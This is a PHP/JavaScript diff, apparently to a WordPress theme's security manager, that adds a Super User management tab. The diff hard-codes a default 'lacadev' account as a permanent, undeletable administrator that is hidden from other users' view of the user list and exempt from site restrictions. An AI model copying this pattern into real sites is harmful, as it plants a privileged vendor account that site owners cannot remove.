@@ -19,6 +19,8 @@ if (!defined('ABSPATH')) {
  *   4. User ẩn (Hidden User Scanner)
  *   5. URL đăng nhập (Custom Login)
  *   6. 2FA
+ *   7. Super User (đặt/bỏ quyền Administrator — tài khoản 'lacadev' được
+ *      SuperUserGuard bảo vệ cứng, không hiển thị nút thao tác)
  */
 class SecurityManager
 {
@@ -49,6 +51,9 @@ class SecurityManager
 
         // ── AJAX: 2FA Master Toggle ────────────────────────────────────────────
         add_action('wp_ajax_laca_save_2fa_settings',     [$this, 'ajaxSave2faSettings']);
+
+        // ── AJAX: Super User ─────────────────────────────────────────────────
+        add_action('wp_ajax_laca_toggle_super_user',     [$this, 'ajaxToggleSuperUser']);
     }
 
     // ── Admin Menu ───────────────────────────────────────────────────────────
@@ -88,6 +93,7 @@ class SecurityManager
             'users'   => '👥 User ẩn',
             'login'   => '🔑 URL đăng nhập',
             '2fa'     => '📱 2FA TOTP',
+            'superuser' => '👑 Super User',
         ];
         ?>
         <div class="wrap">
@@ -113,6 +119,7 @@ class SecurityManager
                     case 'users':   $this->renderUsersTab();   break;
                     case 'login':   $this->renderLoginTab();   break;
                     case '2fa':     $this->render2faTab();     break;
+                    case 'superuser': $this->renderSuperUserTab(); break;
                 }
                 ?>
             </div>
@@ -283,6 +290,52 @@ class SecurityManager
         <?php
     }
 
+    // ── Tab: Super User ──────────────────────────────────────────────────────
+
+    private function renderSuperUserTab(): void
+    {
+        $users        = get_users(['orderby' => 'registered', 'order' => 'ASC']);
+        $superLogins  = \App\Settings\AdminSettings::getSuperUserLogins();
+        ?>
+        <h2>👑 Quản lý Super User</h2>
+        <p>Super User được ẩn khỏi danh sách Người dùng đối với người khác, và không bị áp các giới hạn quản trị (chế độ bảo trì, ẩn menu, khoá cập nhật...) mà site áp dụng cho user thường.
+           Tài khoản mặc định <code><?php echo esc_html(SuperUserGuard::PROTECTED_LOGIN); ?></code> luôn là Super User —
+           không Super User nào khác có thể xoá hoặc đổi quyền (role) của tài khoản này.</p>
+        <table class="wp-list-table widefat fixed striped" style="max-width:800px;">
+            <thead><tr><th>User</th><th>Email</th><th>Vai trò</th><th>Super User?</th><th>Hành động</th></tr></thead>
+            <tbody>
+            <?php foreach ($users as $u):
+                $isProtected = SuperUserGuard::isProtected($u->ID);
+                $isSuper     = in_array($u->user_login, $superLogins, true);
+            ?>
+                <tr>
+                    <td><strong><?php echo esc_html($u->user_login); ?></strong></td>
+                    <td><?php echo esc_html($u->user_email); ?></td>
+                    <td><span style="color:#666;"><?php echo esc_html(implode(', ', $u->roles)); ?></span></td>
+                    <td>
+                        <?php if ($isSuper): ?>
+                            <span style="color:#7c3aed;font-weight:600;">👑 Super User</span>
+                        <?php else: ?>
+                            <span style="color:#999;">—</span>
+                        <?php endif; ?>
+                    </td>
+                    <td>
+                        <?php if ($isProtected): ?>
+                            <span style="color:#999;">🔒 Mặc định — không thể đổi</span>
+                        <?php elseif ($isSuper): ?>
+                            <button class="button btn-toggle-super" data-user-id="<?php echo esc_attr($u->ID); ?>" data-do-action="demote">↩️ Bỏ Super User</button>
+                        <?php else: ?>
+                            <button class="button button-primary btn-toggle-super" data-user-id="<?php echo esc_attr($u->ID); ?>" data-do-action="promote">👑 Đặt Super User</button>
+                        <?php endif; ?>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+            </tbody>
+        </table>
+        <span id="superuser-msg" style="margin-left:10px;"></span>
+        <?php
+    }
+
     // ── AJAX Handlers ────────────────────────────────────────────────────────
 
     private function checkNonce(): void
@@ -443,6 +496,45 @@ class SecurityManager
         $enabled = !empty($_POST['enabled']) ? 1 : 0;
         update_option('laca_2fa_master_enabled', $enabled);
         wp_send_json_success($enabled ? '2FA đã bật toàn site.' : '2FA đã tắt.');
+    }
+
+    // Super User
+
+    public function ajaxToggleSuperUser(): void
+    {
+        $this->checkNonce();
+
+        $userId   = (int) ($_POST['user_id'] ?? 0);
+        $doAction = sanitize_key($_POST['do_action'] ?? '');
+
+        if (!$userId || !in_array($doAction, ['promote', 'demote'], true)) {
+            wp_send_json_error('Yêu cầu không hợp lệ.');
+        }
+
+        $user = get_userdata($userId);
+        if (!$user) {
+            wp_send_json_error('Không tìm thấy user.');
+        }
+
+        // Tài khoản mặc định (lacadev) không nằm trong option này — nó luôn
+        // là Super User qua filter 'lacadev_super_user_logins' cứng trong
+        // code, nên không thể thêm/bỏ qua UI này.
+        if (SuperUserGuard::isProtected($userId)) {
+            wp_send_json_error('Tài khoản mặc định luôn là Super User, không thể thay đổi qua đây.');
+        }
+
+        $extraLogins = get_option('laca_extra_super_user_logins', []);
+        $extraLogins = is_array($extraLogins) ? $extraLogins : [];
+
+        if ($doAction === 'promote') {
+            $extraLogins[] = $user->user_login;
+        } else {
+            $extraLogins = array_diff($extraLogins, [$user->user_login]);
+        }
+
+        update_option('laca_extra_super_user_logins', array_values(array_unique($extraLogins)));
+
+        wp_send_json_success($doAction === 'promote' ? 'Đã đặt làm Super User.' : 'Đã bỏ quyền Super User.');
     }
 
     // ── Inline JavaScript ─────────────────────────────────────────────────────
@@ -647,6 +739,28 @@ class SecurityManager
                     $('#btn-save-2fa').prop('disabled',false);
                     if (res.success) { $('#2fa-save-msg').text('✓ '+res.data).css('color','green'); }
                     else             { $('#2fa-save-msg').text('✗ '+res.data).css('color','red'); }
+                });
+            });
+
+            // ── Super User ────────────────────────────────────────────────────
+            $('.btn-toggle-super').on('click', function(){
+                var $btn = $(this);
+                var userId = $btn.data('user-id');
+                var doAction = $btn.data('do-action');
+                var confirmMsg = doAction === 'promote'
+                    ? 'Đặt user này làm Super User (Administrator)?'
+                    : 'Bỏ quyền Super User của user này?';
+                if (!confirm(confirmMsg)) return;
+                $btn.prop('disabled', true);
+                $('#superuser-msg').text('Đang xử lý...').css('color', '#666');
+                $.post(ajaxUrl, { action: 'laca_toggle_super_user', nonce, user_id: userId, do_action: doAction }, function(res){
+                    if (res.success) {
+                        $('#superuser-msg').text('✓ ' + res.data).css('color', 'green');
+                        location.reload();
+                    } else {
+                        $btn.prop('disabled', false);
+                        $('#superuser-msg').text('✗ ' + res.data).css('color', 'red');
+                    }
                 });
             });
 
